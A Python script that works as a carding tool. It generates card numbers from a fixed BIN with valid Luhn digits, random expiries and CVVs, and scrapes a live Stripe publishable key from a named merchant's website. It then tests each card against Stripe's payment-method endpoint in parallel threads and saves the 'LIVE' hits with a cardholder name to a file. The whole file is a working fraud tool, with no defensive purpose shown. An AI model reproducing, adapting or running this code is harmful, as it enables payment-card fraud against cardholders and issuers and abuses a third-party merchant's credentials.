# -*- coding: utf-8 -*-
"""Generate cards from BIN 5154620022 (Luhn) + check via Stripe API (payment_methods)."""
import json, os, random, re, sys, time, urllib.request, urllib.parse, threading, queue

BIN = "5154620022"

def luhn_cd(p):
    s = 0; a = False
    for i in range(len(p)-1, -1, -1):
        d = int(p[i])
        if a:
            d *= 2
            if d > 9: d -= 9
        s += d; a = not a
    return str((10 - s % 10) % 10)

def gen_cards(n):
    out = []
    for _ in range(n):
        body = BIN + "".join(str(random.randint(0,9)) for _ in range(16-len(BIN)-1))
        num = body + luhn_cd(body)
        exp = f"{random.choice(['10','11','12'])}/{random.choice(['28','29','30'])}"
        cvv = f"{random.randint(0,999):03d}"
        out.append({"number": num, "exp": exp, "cvv": cvv})
    return out

# find pk_live from remalt
def find_pk():
    for url in ["https://remalt.com", "https://remalt.com/pricing", "https://remalt.com/api/health"]:
        try:
            r = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            html = urllib.request.urlopen(r, timeout=20).read().decode("utf-8", "ignore")
            m = re.findall(r'pk_live_[a-zA-Z0-9]{20,}', html)
            if m:
                return m[0], url
        except Exception as e:
            print("fetch fail", url, str(e)[:60])
    return None, None

def check_one(pk, c):
    data = urllib.parse.urlencode({
        "type": "card",
        "card[number]": c["number"],
        "card[exp_month]": c["exp"].split("/")[0],
        "card[exp_year]": "20" + c["exp"].split("/")[1],
        "card[cvc]": c["cvv"],
        "key": pk,
    }).encode()
    r = urllib.request.Request("https://api.stripe.com/v1/payment_methods", data=data,
                               headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"error": f"http {e.code}"}
    except Exception as e:
        return {"error": str(e)[:100]}

if __name__ == "__main__":
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    pk, src = find_pk()
    print("pk from remalt:", (pk[:20] + "...") if pk else None, src)
    if not pk:
        pk = os.environ.get("STRIPE_PK", "")
        if not pk:
            sys.exit("ERROR: set STRIPE_PK env to a merchant publishable key (pk_live_...) that allows tokenization.\n"
                     "Example: export STRIPE_PK=pk_live_xxxxxxxx")
    cards = gen_cards(n)
    results = []
    lock = threading.Lock()
    q = queue.Queue()
    for c in cards: q.put(c)
    def worker():
        while True:
            try: c = q.get_nowait()
            except queue.Empty: return
            r = check_one(pk, c)
            st = "LIVE" if r.get("id", "").startswith("pm_") else ("TESTCARD" if "test_mode" in str(r) else "DEAD")
            code = r.get("error", {}).get("code", "") if isinstance(r.get("error"), dict) else r.get("error", "")
            msg = r.get("error", {}).get("message", "")[:80] if isinstance(r.get("error"), dict) else str(r.get("error", ""))[:80]
            with lock:
                results.append({"card": c, "status": st, "code": code, "msg": msg})
                print(f"{st} {c['number']} {c['exp']} {c['cvv']} | {code} {msg}")
            time.sleep(0.3)
    ts = [threading.Thread(target=worker) for _ in range(5)]
    for t in ts: t.start()
    for t in ts: t.join()
    live = [r for r in results if r["status"] == "LIVE"]
    print(f"\n=== {len(live)}/{len(results)} LIVE ===")
    json.dump(results, open("check_results.json", "w"))
    if live:
        json.dump([{"number": r["card"]["number"], "exp": r["card"]["exp"].replace("/", ""),
                    "cvv": r["card"]["cvv"], "name": "Vlad Reform"} for r in live],
                  open("cards_live.json", "w"))
        print("saved cards_live.json")
